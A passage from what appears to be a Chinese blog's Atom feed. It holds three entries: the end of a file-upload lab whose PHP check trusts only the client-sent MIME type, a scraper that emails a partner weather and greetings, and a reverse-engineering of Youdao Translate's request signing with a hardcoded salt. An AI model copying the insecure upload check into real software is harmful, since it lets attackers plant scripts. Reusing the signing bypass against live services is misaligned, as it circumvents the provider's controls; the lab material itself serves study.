invoke__&quot;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;image/jpeg&amp;#x27;&lt;/span&gt;) || (&lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;) || (&lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;image/gif&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable&quot;&gt;$temp_file&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable&quot;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&quot;string&quot;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;title function_ invoke__&quot;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$temp_file&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;variable&quot;&gt;$is_upload&lt;/span&gt; = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;variable&quot;&gt;$msg&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable&quot;&gt;$msg&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&amp;#x27;文件类型不正确，请重新上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;variable&quot;&gt;$msg&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&quot;string&quot;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web漏洞" scheme="http://example.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>利用爬虫定时给女友发送暖心邮件</title>
    <link href="http://example.com/2022/05/11/%E5%88%A9%E7%94%A8%E7%88%AC%E8%99%AB%E5%AE%9A%E6%97%B6%E7%BB%99%E5%A5%B3%E5%8F%8B%E5%8F%91%E9%80%81%E6%9A%96%E5%BF%83%E9%82%AE%E4%BB%B6/"/>
    <id>http://example.com/2022/05/11/%E5%88%A9%E7%94%A8%E7%88%AC%E8%99%AB%E5%AE%9A%E6%97%B6%E7%BB%99%E5%A5%B3%E5%8F%8B%E5%8F%91%E9%80%81%E6%9A%96%E5%BF%83%E9%82%AE%E4%BB%B6/</id>
    <published>2022-05-11T10:50:00.000Z</published>
    <updated>2022-05-15T06:34:54.786Z</updated>
    
    <content type="html"><![CDATA[<p>爬取墨迹天气,土味情话,ONE每日图片定时发送邮件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"></span><br><span class="line">sender_maile = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 发件人地址</span></span><br><span class="line">sender_pass = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 邮件授权码</span></span><br><span class="line">boy_name = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 发件人姓名</span></span><br><span class="line">girl_name = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 收件人姓名</span></span><br><span class="line">maile_obj = smtplib.SMTP_SSL(<span class="string">&#x27;smtp.qq.com&#x27;</span>, <span class="number">465</span>)  <span class="comment"># 发送的服务器</span></span><br><span class="line">receiver_mail = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 收件人邮箱</span></span><br><span class="line">special_day = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 纪念日</span></span><br><span class="line">province = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 省份 墨迹天气官网查看 示例province = &#x27;guangxi&#x27;</span></span><br><span class="line">city = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 城市 示例city = &#x27;jiangnan-district&#x27; </span></span><br><span class="line">title = <span class="string">&#x27;s&#x27;</span>  <span class="comment"># 邮件主题</span></span><br><span class="line">ua = UserAgent()</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://tianqi.moji.com/weather/china/guangxi&#x27;</span>, <span class="comment"># 根据城市修改</span></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: ua.random</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取纪念日距今多少天</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_day</span>():</span><br><span class="line">    d1 = datetime.datetime.strptime(special_day, <span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">    d2 = datetime.datetime.strptime(datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>), <span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">    delta = d2 - d1</span><br><span class="line">    <span class="keyword">return</span> delta.days</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每日土味情话</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chp</span>():</span><br><span class="line">    url =  <span class="string">&quot;https://api.lovelive.tools/api/SweetNothings&quot;</span></span><br><span class="line">    resp = requests.get(url=url)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取提醒</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weathertip</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">f&#x27;https://tianqi.moji.com/weather/china/<span class="subst">&#123;province&#125;</span>/<span class="subst">&#123;city&#125;</span>&#x27;</span></span><br><span class="line">        resp = session.get(url=url, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">        html = etree.HTML(resp.text)</span><br><span class="line">        em = html.xpath(<span class="string">&#x27;/html/body/div[4]/div[1]/div[4]/em/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> em</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每日天气</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weather</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">f&#x27;https://tianqi.moji.com/weather/china/<span class="subst">&#123;province&#125;</span>/<span class="subst">&#123;city&#125;</span>&#x27;</span></span><br><span class="line">        resp = session.get(url=url, headers=header,  verify=<span class="literal">False</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        htmls = etree.HTML(resp.text)</span><br><span class="line">        ul = htmls.xpath(<span class="string">&#x27;/html/body/div[5]/div[1]/div[1]/ul&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> lis <span class="keyword">in</span> ul:</span><br><span class="line">            <span class="comment"># 获取日期</span></span><br><span class="line">            day = lis.xpath(<span class="string">&#x27;./li[1]/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 获取天气图标</span></span><br><span class="line">            src = lis.xpath(<span class="string">&#x27;./li[2]/span/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 获取天气状况</span></span><br><span class="line">            weather = lis.xpath(<span class="string">&#x27;./li[2]/span/img/@alt&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 获取温度</span></span><br><span class="line">            temperature = lis.xpath(<span class="string">&#x27;./li[3]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 获取空气质量</span></span><br><span class="line">            air = lis.xpath(<span class="string">&#x27;./li[5]/strong/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            <span class="comment"># 获取空气质量对应的字体颜色</span></span><br><span class="line">            color = <span class="built_in">str</span>(lis.xpath(<span class="string">&#x27;./li[5]/strong/@class&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">            <span class="comment"># 判断字体颜色</span></span><br><span class="line">            <span class="keyword">if</span> color == <span class="string">&#x27;level_1&#x27;</span>:</span><br><span class="line">                color = <span class="string">&#x27;#8fc31f&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> color == <span class="string">&#x27;level_2&#x27;</span>:</span><br><span class="line">                color = <span class="string">&#x27;#d7af0e&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> color == <span class="string">&#x27;level_3&#x27;</span>:</span><br><span class="line">                color = <span class="string">&#x27;#f39800&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> color == <span class="string">&#x27;level_4&#x27;</span>:</span><br><span class="line">                color = <span class="string">&#x27;#e2361a&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> color == <span class="string">&#x27;level_5&#x27;</span>:</span><br><span class="line">                color = <span class="string">&#x27;#5f52a0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> color == <span class="string">&#x27;level_6&#x27;</span>:</span><br><span class="line">                color = <span class="string">&#x27;#631541&#x27;</span></span><br><span class="line">            html += <span class="string">&quot;&quot;&quot;&lt;div style=&quot;display: flex;margin-top:5px;height: 30px;line-height: 30px;justify-content: space-around;align-items: center;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;span style=&quot;width:15%%; text-align:center;&quot;&gt;%s&lt;/span&gt;</span></span><br><span class="line"><span class="string">            &lt;div style=&quot;width:10%%; text-align:center;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;img style=&quot;height:26px;vertical-align:middle;&quot; src=&#x27;%s&#x27; alt=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;span style=&quot;width:25%%; text-align:center;&quot;&gt;%s&lt;/span&gt;</span></span><br><span class="line"><span class="string">            &lt;div style=&quot;width:35%%; &quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;span style=&quot;display:inline-block;padding:0 8px;line-height:25px;color:%s; border-radius:15px; text-align:center;&quot;&gt;%s&lt;/span&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (day, src, temperature, color, air)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_image</span>():</span><br><span class="line">    url = <span class="string">&quot;http://wufazhuce.com/&quot;</span></span><br><span class="line">    resp = requests.get(url=url)</span><br><span class="line">    html = etree.HTML(resp.text)</span><br><span class="line">    img_url = html.xpath(<span class="string">&#x27;//*[@id=&quot;carousel-one&quot;]/div/div[1]/a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> img_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当天日期</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_today</span>():</span><br><span class="line">    i = datetime.datetime.now()</span><br><span class="line">    date = <span class="string">&quot;%s/%s/%s&quot;</span> % (i.year, i.month, i.day)</span><br><span class="line">    <span class="keyword">return</span> date</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mail_content = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">                &lt;html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;head&gt;</span></span><br><span class="line"><span class="string">                    &lt;title&gt;</span></span><br><span class="line"><span class="string">                    &lt;/title&gt;</span></span><br><span class="line"><span class="string">                    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;body style=&quot;margin:0;padding:0;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div style=&quot;width:100%; margin: 40px auto;font-size:20px; color:#5f5e5e;text-align:center&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;今天是我们在一起的第&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;span style=&quot;font-size:24px;color:rgb(221, 73, 73)&quot;  &gt;&#123;0&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;天&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div style=&quot;width:100%; margin: 0 auto;color:#5f5e5e;text-align:center&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;span style=&quot;display:block;color:#676767;font-size:20px&quot;&gt;&#123;2&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;span style=&quot;display:block;color:#676767;font-size:20px&quot;&gt;&#123;1&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;span style=&quot;display:block;margin-top:15px;color:#676767;font-size:15px&quot;&gt;近期天气预报&lt;/span&gt;</span></span><br><span class="line"><span class="string">                &#123;3&#125;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div style=&quot;text-align:center;margin:35px 0;&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;span style=&quot;display:block;margin-top:55px;color:#676767;font-size:15px&quot;&gt;&#123;4&#125; ❤️ &#123;5&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                            &lt;span style=&quot;display:block;margin-top:25px;font-size:22px; color:#9d9d9d; &quot;&gt;&#123;6&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                             &lt;img src=&#x27;&#123;7&#125;&#x27; style=&quot;width:100%;margin-top:10px;&quot;  alt=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;/html&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(get_day()), get_weathertip(), get_chp(), get_weather(), boy_name, girl_name,</span><br><span class="line">                                  get_today(), get_image())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送邮件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_mail</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        maile_obj.login(sender_maile, sender_pass)</span><br><span class="line">        <span class="comment"># 三个参数分别是发件人邮箱账号,收件人账号,发送的邮件内容</span></span><br><span class="line">        msg = MIMEText(mail_content, _subtype=<span class="string">&#x27;html&#x27;</span>, _charset=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        msg[<span class="string">&#x27;Subject&#x27;</span>] = title</span><br><span class="line">        msg[<span class="string">&#x27;From&#x27;</span>] = <span class="string">&quot;发送人名称&quot;</span></span><br><span class="line">        msg[<span class="string">&#x27;To&#x27;</span>] = <span class="string">&quot;接收人名称&quot;</span></span><br><span class="line">        maile_obj.sendmail(sender_maile, receiver_mail, msg.as_string())</span><br><span class="line">        maile_obj.quit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    send_mail()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;发送成功!&#x27;</span>)</span><br><span class="line">    theTime = datetime.datetime.now()</span><br><span class="line">    <span class="built_in">print</span>(theTime)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151434500.png?token=ARYCSAQPCUTWVPSDZCCU65LCQCPT2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;爬取墨迹天气,土味情话,ONE每日图片定时发送邮件&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
      
    
    
    
    <category term="爬虫" scheme="http://example.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="requests" scheme="http://example.com/tags/requests/"/>
    
  </entry>
  
  <entry>
    <title>有道翻译逆向</title>
    <link href="http://example.com/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/"/>
    <id>http://example.com/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/</id>
    <published>2022-05-07T10:25:23.000Z</published>
    <updated>2022-05-07T10:32:17.670Z</updated>
    
    <content type="html"><![CDATA[<p>js源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="string">&quot;newweb/common/service&quot;</span>, [<span class="string">&quot;./utils&quot;</span>, <span class="string">&quot;./md5&quot;</span>, <span class="string">&quot;./jquery-1.7&quot;</span>], <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="title function_">e</span>(<span class="string">&quot;./jquery-1.7&quot;</span>);</span><br><span class="line">    <span class="title function_">e</span>(<span class="string">&quot;./utils&quot;</span>);</span><br><span class="line">    <span class="title function_">e</span>(<span class="string">&quot;./md5&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> r = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="title function_">md5</span>(navigator.<span class="property">appVersion</span>)</span><br><span class="line">            , r = <span class="string">&quot;&quot;</span> + (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>()</span><br><span class="line">            , i = r + <span class="built_in">parseInt</span>(<span class="number">10</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>(), <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">ts</span>: r,</span><br><span class="line">            <span class="attr">bv</span>: t,</span><br><span class="line">            <span class="attr">salt</span>: i,</span><br><span class="line">            <span class="attr">sign</span>: n.<span class="title function_">md5</span>(<span class="string">&quot;fanyideskweb&quot;</span> + e + i + <span class="string">&quot;Ygy_4c=r#e#4EX^NUGUc5&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// e = 翻译的字符串, i = 字符串形式的js时间戳+一位整数</span></span><br></pre></td></tr></table></figure><p>python实现代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fanyi</span>(<span class="params">word</span>):</span><br><span class="line">    <span class="comment"># 13位时间戳</span></span><br><span class="line">    lts = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">    <span class="comment"># 时间戳+一个随机整数</span></span><br><span class="line">    salt = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">10000</span>))</span><br><span class="line">    <span class="comment"># 写死的两个参数+翻译的字符+salt</span></span><br><span class="line">    sign = <span class="string">&quot;fanyideskweb&quot;</span> + word + salt + <span class="string">&quot;Y2FYu%TNSbMCxc3t2u^XT&quot;</span></span><br><span class="line">    <span class="comment"># md5 加密字符</span></span><br><span class="line">    sign = hashlib.md5(sign.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    data = &#123;<span class="string">&quot;i&quot;</span>: word,</span><br><span class="line">            <span class="string">&quot;from&quot;</span>: <span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">            <span class="string">&quot;to&quot;</span>: <span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">            <span class="string">&quot;smartresult&quot;</span>: <span 